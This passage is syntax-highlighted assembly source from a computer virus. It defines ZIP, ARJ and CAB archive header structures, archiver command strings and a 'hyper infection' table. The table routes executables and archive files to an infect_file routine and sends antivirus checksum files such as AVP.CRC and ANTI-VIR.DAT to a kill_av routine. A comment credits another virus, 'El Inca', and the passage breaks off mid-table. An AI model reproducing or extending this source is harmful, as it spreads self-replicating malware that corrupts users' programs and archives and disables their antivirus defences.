  </span><span class="sc5">ARJEnd</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0EA60h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">ARJNeededBytes</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ARJ_struct_finish</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ARJ_struct</span><span class="sc0">
</span><span class="sc5">ARJGetSizeOnly</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ARJVersionDone</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ARJ_struct</span><span class="sc0">

        </span><span class="sc1">; ZIP archivez struct</span><span class="sc0">

</span><span class="sc5">ZIPInfoBuffer</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">       </span><span class="sc1">;thanks to ZIP's structs</span><span class="sc0">
  </span><span class="sc5">ZIPRHeaderId</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'PK'</span><span class="sc0">        </span><span class="sc1">;from Vecna's "El Inca"</span><span class="sc0">
  </span><span class="sc5">ZIPRSignature</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">    </span><span class="sc1">;virus</span><span class="sc0">
  </span><span class="sc5">ZIPRVerMade</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">000Ah</span><span class="sc0">
  </span><span class="sc5">ZIPRVerNeed</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">000Ah</span><span class="sc0">
  </span><span class="sc5">ZIPRFlags</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPRMethod</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPRTimeDate</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPRCRC32</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPRCompressed</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPRUncompressed</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPRSizeFilename</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPRExtraField</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPRCommentSize</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPRDiskNumba</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPRInternalAttr</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPRExternalAttr</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPROffsetLHeaderR</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPRFilename</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ZIPRHeaderSize</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ZIPRFilename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ZIPRHeaderId</span><span class="sc0">
</span><span class="sc5">ZIPRScanSize1</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ZIPRSizeFilename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ZIPRHeaderId</span><span class="sc0">
</span><span class="sc5">ZIPRScanSize2</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ZIPRFilename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ZIPRSizeFilename</span><span class="sc0">
</span><span class="sc5">ZIPRScanSize3</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ZIPROffsetLHeaderR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ZIPRSizeFilename</span><span class="sc0">

</span><span class="sc5">ZIPMHeaderBuffer</span><span class="sc0">    </span><span class="sc9">struc</span><span class="sc0">           </span><span class="sc1">;this structure ain't</span><span class="sc0">
  </span><span class="sc5">ZIPLHeaderId</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'PK'</span><span class="sc0">        </span><span class="sc1">;neccessary for ZIP's</span><span class="sc0">
  </span><span class="sc5">ZIPLSignature</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0403h</span><span class="sc0">       </span><span class="sc1">;operations</span><span class="sc0">
  </span><span class="sc5">ZIPLVersionNeed</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPLFlags</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPLMethod</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPLDateTime</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPLCRC32</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPLCompressed</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPLUncompressed</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPLSizeFilename</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPLExtraField</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPLFilename</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">ZIPMScanSize</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ZIPLSizeFilename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ZIPMHeaderBuffer</span><span class="sc0">
</span><span class="sc5">ZIPMFilename</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ZIPLFilename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ZIPMHeaderBuffer</span><span class="sc0">

</span><span class="sc5">ZIPReadBuffer</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
  </span><span class="sc5">ZIPEHeaderId</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'PK'</span><span class="sc0">
  </span><span class="sc5">ZIPSignature</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPNoDisk</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPNoStartDisk</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPEntryDisk</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPEntrysDir</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ZIPSizeDir</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPOffsetDir</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ZIPCommentLenght</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ZIPReadBuffer</span><span class="sc0">

        </span><span class="sc1">; CAB achivez struct</span><span class="sc0">

</span><span class="sc5">CAB_h_struct</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
  </span><span class="sc5">CABh_Magic</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MSCF'</span><span class="sc0">      </span><span class="sc1">;"MSCF" signature</span><span class="sc0">
  </span><span class="sc5">CABh_Reserved1</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;reserved</span><span class="sc0">
  </span><span class="sc5">CABh_FileSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;file size of this cabinet</span><span class="sc0">
  </span><span class="sc5">CABh_Reserved2</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;reserved</span><span class="sc0">
  </span><span class="sc5">CABh_FirstRec</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;offset of the 1st entry</span><span class="sc0">
  </span><span class="sc5">CABh_Reserved3</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;reserved</span><span class="sc0">
  </span><span class="sc5">CABh_VersionMin</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;CAB file format version</span><span class="sc0">
  </span><span class="sc5">CABh_VersionMaj</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;curently: 0x0103</span><span class="sc0">
  </span><span class="sc5">CABh_nFolders</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;number of folders</span><span class="sc0">
  </span><span class="sc5">CABh_nFiles</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;number of files</span><span class="sc0">
  </span><span class="sc5">CABh_Flags</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;1=exist its prev. cabinet</span><span class="sc0">
                        </span><span class="sc1">;2=exist its next  cabinet</span><span class="sc0">
                        </span><span class="sc1">;4=exist its reser. field</span><span class="sc0">
  </span><span class="sc5">CABh_ID</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;identification number</span><span class="sc0">
  </span><span class="sc5">CABh_Number</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;number of cab (0=the first)</span><span class="sc0">
</span><span class="sc5">CAB_h_finish</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">CAB_reserved</span><span class="sc0">        </span><span class="sc9">struct</span><span class="sc0">
  </span><span class="sc5">CABr_length</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;if CABh_Flags=4</span><span class="sc0">
  </span><span class="sc5">CABr_reserved</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">CAB_directory_start</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
  </span><span class="sc5">CABd_FirstRec</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;offset of the 1st dir</span><span class="sc0">
  </span><span class="sc5">CABd_nData</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;number of cfDATA structz</span><span class="sc0">
  </span><span class="sc5">CABd_Compress</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;compression type</span><span class="sc0">
  </span><span class="sc5">CABd_Reserved</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">   </span><span class="sc1">;this can be reserved area</span><span class="sc0">

</span><span class="sc5">CAB_file_start</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
  </span><span class="sc5">CABf_UnCompSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;file size (uncompressed)</span><span class="sc0">
  </span><span class="sc5">CABf_FileStart</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;offset of the file</span><span class="sc0">
  </span><span class="sc5">CABf_Flags</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;0000=file in folder #0</span><span class="sc0">
                        </span><span class="sc1">;0001=file in folder #1</span><span class="sc0">
                        </span><span class="sc1">;FFFD=file from prev</span><span class="sc0">
                        </span><span class="sc1">;FFFE=file to next</span><span class="sc0">
                        </span><span class="sc1">;FFFF=file prev_and_next</span><span class="sc0">
  </span><span class="sc5">CABf_Date</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">1234h</span><span class="sc0">       </span><span class="sc1">;date</span><span class="sc0">
  </span><span class="sc5">CABf_Time</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">1234h</span><span class="sc0">       </span><span class="sc1">;time</span><span class="sc0">
  </span><span class="sc5">CABf_Attribs</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0020h</span><span class="sc0">       </span><span class="sc1">;attr of the file</span><span class="sc0">
  </span><span class="sc5">CABf_FileName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;file_name + 00h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">CAB_entry</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
  </span><span class="sc5">CABe_CRC</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;checksum of this entry</span><span class="sc0">
  </span><span class="sc5">CABe_Compr</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;compressed size</span><span class="sc0">
  </span><span class="sc5">CABe_UnCompr</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;uncompressed size</span><span class="sc0">
  </span><span class="sc5">CABe_Compr_data</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; generate command for archiver programs by this table</span><span class="sc0">
        </span><span class="sc1">; include compress method, archives filenames, and "&gt;nul"</span><span class="sc0">
        </span><span class="sc1">; note: 32=20h because of i'm using DN (and it does optim.)</span><span class="sc0">

</span><span class="sc5">ArchiverCommand</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' a -ep -std -m'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc12">'12345'</span><span class="sc0">   </span><span class="sc1">;ACE</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' a -ep'</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0"> \
                    </span><span class="sc12">'-m'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc12">'12345'</span><span class="sc0">   </span><span class="sc1">;RAR</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' a -e'</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0"> \
                    </span><span class="sc12">'-m'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc12">'1234 '</span><span class="sc0">   </span><span class="sc1">;ARJ</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' -a'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0"> \
                    </span><span class="sc12">'-e'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc12">'xnfs '</span><span class="sc0">   </span><span class="sc1">;PKZIP</span><span class="sc0">

</span><span class="sc5">ArchiverCommandSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0000000Eh</span><span class="sc0">       </span><span class="sc1">;lenght of one command</span><span class="sc0">
</span><span class="sc5">ArchiverCommandRealSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000014h</span><span class="sc0">       </span><span class="sc1">;lenght of command + c. method</span><span class="sc0">

        </span><span class="sc1">; I must find these programs by hyper infection</span><span class="sc0">
        </span><span class="sc1">; the 1st value means - 00h = only extension, 01h = name</span><span class="sc0">
        </span><span class="sc1">; the 4th value means - 00h = search, 01h = don't search</span><span class="sc0">
        </span><span class="sc1">; the 5th value means - jump there, if found</span><span class="sc0">
        </span><span class="sc1">; the 6th value means - useful value for that function</span><span class="sc0">

</span><span class="sc5">HyperTable</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'PKZIP.EXE'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">archive_act</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewZIP</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'ARJ.EXE'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">archive_act</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewARJ</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'RAR.EXE'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">archive_act</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewRAR</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'ACE.EXE'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">archive_act</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewACE</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'.EXE'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'.ZIP'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;Internet's archive</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'.ARJ'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;Old archive</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'.RAR'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;User's archive</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'.ACE'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;Hacker's archive</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'.CAB'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;Fucking MicroSoft's</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">;archive format</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'AVP.CRC'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_av</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'IVP.NTZ'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_av</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'ANTI-VIR.DAT'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_av</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'CHKLIST.MS'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
